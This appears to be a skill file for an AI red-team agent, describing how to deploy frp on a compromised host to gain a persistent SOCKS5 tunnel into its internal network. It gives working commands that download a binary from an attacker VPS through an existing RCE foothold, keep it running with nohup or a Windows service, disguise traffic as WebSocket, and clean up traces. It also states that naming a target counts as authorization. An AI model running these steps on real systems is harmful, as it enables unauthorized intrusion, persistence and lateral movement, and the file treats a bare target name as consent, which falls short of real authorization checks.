---
name: frp-tunnel
description: 【Tunnel】frp internal-network penetration — run frps on your own VPS and frpc on the target to obtain a stable socks5 and port mappings
whenToUse: When command execution/RCE is available and the target can reach the internet; when you need a long-term stable tunnel and want to map internal ports for the user to access directly
role: internal
category: Tunnel
tags: [tunnel, port-forward, stable]
enabled: true
---

# frp (Internal-Network Penetration, the Most Stable Long-Term Tunnel)

> **Load the VPS configuration first**: every `$REDTEAM_VPS_HOST` / `$VPS_USER` in this skill comes from the local configuration,
> which is read from `$DSH_HOME/.env`. Source it once before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Tools are prepared by the user; this skill does not provide downloads, install scripts, or tutorials.

`frp` is the **most stable and most commonly used** penetration approach: run `frps` (server) on the VPS and `frpc` (client)
on the target to map out an internal socks5 or any port. Compared with suo5/chisel it is **designed for long-term stable
operation** (auto-reconnect, multiplexing, TLS), which makes it suitable for an internal channel that **stays up long-term**
after you get in.

**Division of labor**: with a WebShell → `suo5-tunnel`; with only command execution and a quick way into the internal network → `chisel-tunnel`;
for **long-term stability + handing the port directly to the user** → this skill.

## Local binaries

| File | Path | Purpose |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | Server on the VPS |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | Client on the target |

Already synced to the VPS payload directory `http://$REDTEAM_VPS_HOST:9100/`. A sample `frps` configuration is also on the VPS.

## 1. VPS side — start frps (do this first)

```bash
# 1) Upload and prepare (local machine → VPS)
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) Write the configuration (on the VPS)
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc connection port
auth.method = "token"
auth.token = "<random strong token>"   # Required: anything exposed publicly must have a token, otherwise scanners find it and use it for free

# Optional: vhostHTTPPort / vhostHTTPSPort for HTTP-type penetration
EOF

# 3) Run it inside tmux (it must survive an SSH disconnect)
tmux new -s frps
/root/frps -c /root/frps.toml
```

**VPS security group allowances**: `7000` (the frpc connection port) plus the subsequently mapped ports (e.g. `1080`, `13389`).

## 2. Target side — run frpc

```bash
# 1) Pull the binary (through the existing command-execution point)
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) Write the configuration
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<the same token as frps>"

# (1) Internal SOCKS5 (the most useful: the whole internal network becomes reachable)
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# (2) Specific port mapping (e.g. internal RDP → VPS 13389)
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# (3) Optional: HTTP type (paired with frps vhostHTTPPort when only 80/443 egress is allowed)
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) Run persistently in the background (nohup + automatic reconnect on disconnect)
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows target: frpc.exe -c C:\Windows\Temp\frpc.toml (use sc create to register it as a service for persistence)
```

## 3. Using the tunnel locally

```bash
# SOCKS5 mode: VPS:1080 is the internal network entry point
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# In the config write: socks5 $REDTEAM_VPS_HOST 1080
# ⛔ Do not modify /etc/proxychains4.conf; use -f to point at a temporary config under runs/

# Port-mapping mode: connect directly to the VPS port
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 4. Variants when egress is restricted

| Restriction | Handling |
| --- | --- |
| Only 80/443 egress allowed | frps `bindPort = 443` (or run the HTTP type on 80 first), and change the frpc port accordingly |
| A TLS middlebox intercepts traffic | frp has `transport.tls.enable = true` built in (on by default); if needed use `transport.protocol = "kcp"` or `websocket` |
| The target cannot reach the internet | frp is not usable → use a WebShell-side tunnel (`suo5-tunnel`) |
| Traffic must look normal | `transport.protocol = "websocket"` + `transport.tls.enable = true` (on 443 it looks like ordinary WebSocket) |

## 5. Persistence and discipline

1. **It must run under tmux (server) / nohup (client)**, otherwise the tunnel dies the moment the session drops.
2. **The server must set `auth.token`**: port 7000 of a public VPS is scanned by the whole internet; without a token you are handing your internal network to anyone.
3. **Do not reuse tokens**: generate a new random token for every exercise; shut down promptly with `pkill frps` / `pkill frpc` when done.
4. **Watch artifact traces on the target**: put the binary and config in `/tmp` and clean up afterwards; on Windows use the `Temp` directory.
5. **Do not use it for unlawful purposes**: this skill is limited to authorized exercises (the user naming a target means it is authorized).

## 6. Output and database registration (mandatory)

1. **Register the tunnel with `redteam_tunnel_add`**, filling in every field:
   - `kind`: `frp`;
   - `listen`: the address the user actually uses (e.g. `$REDTEAM_VPS_HOST:1080`);
   - `entry`: the target-side entry (e.g. `/tmp/frpc on 10.0.0.6 → VPS:7000`);
   - `reach`: the **measured reachable segments**;
   - `entry_kind`: **`target-outbound`** (the target dials out to our frps — this is frp's typical shape);
     ⛔ Filling `self-only` when you only opened a proxy on your own VPS → it will be marked "not a breach";
   - `command`: the complete frps and frpc command lines + configuration essentials (token redacted).
2. **Live connectivity test**: `curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<internal target>/`; register as active only once it passes,
   then re-check with `redteam_session_check`.
3. **Scoring**: `boundary` (the tunnel reaches the internal network; evidence written as "tunnel address | reachable segments | internal target actually accessed");
   lateral movement through it → `server-host`.
4. **Deliver to the user**: give a paste-ready `socks5://$REDTEAM_VPS_HOST:1080` or the mapped port, stating the address and port explicitly.
5. When scoring, put the actual command/output into `command`/`result` of `redteam_score_hit`; no separate chain entry is needed
   (e.g. `frpc registered successfully, proxy socks5 start success`).
